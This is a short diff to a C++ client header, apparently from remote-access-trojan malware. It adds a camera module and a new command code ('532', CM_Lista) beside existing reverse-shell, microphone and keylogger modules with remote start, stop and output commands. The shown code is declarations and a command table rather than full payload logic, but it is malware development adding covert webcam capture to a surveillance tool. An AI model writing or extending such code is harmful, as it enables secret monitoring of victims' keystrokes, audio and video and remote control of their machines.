@@ -4,6 +4,7 @@
 #include "headers.hpp"
 #include "mod_mic.hpp"
 #include "mod_keylogger.hpp"
+#include "mod_camara.hpp"
 
 class ReverseShell;
 class Mod_Mic;
@@ -21,6 +22,7 @@ class Cliente {
 		ReverseShell* reverseSHELL = nullptr;
 		Mod_Mic* mod_Mic = nullptr;
 		mod_Keylogger* mod_Key = nullptr;
+		mod_Camera* mod_Cam = nullptr;
 
 
 		//Para recibir archivo (single)
@@ -57,7 +59,8 @@ class Cliente {
 			{"527", EnumComandos::PM_Kill},
 			{"529", EnumComandos::KL_Iniciar},
 			{"530", EnumComandos::KL_Detener},
-			{"531", EnumComandos::KL_Salida}
+			{"531", EnumComandos::KL_Salida},
+			{"532", EnumComandos::CM_Lista}
 
 		};
 
